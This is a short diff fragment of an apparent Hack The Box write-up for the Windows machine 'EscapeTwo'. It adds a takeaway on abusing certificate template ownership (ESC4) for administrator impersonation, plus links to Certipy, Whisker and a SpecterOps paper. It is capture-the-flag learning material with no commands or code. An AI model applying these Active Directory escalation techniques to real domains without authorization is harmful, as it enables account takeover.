+**Key Technical Takeaway:** Users with object ownership capabilities over certificate services accounts can modify certificate templates to enable administrator impersonation through ESC4 exploitation.
 
 ---
-
-## Phase 3: Privilege Escalation
-
-
 
 ## References
-- 
+- [Certificate Services ESC4 Attack Path](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+- [Whisker: Shadow Credentials Attack](https://github.com/eladshamir/Whisker)
+- [Certipy Certificate Services Enumeration](https://github.com/ly4k/Certipy)
 
 ---
 #escapetwo #htb #easy #windows
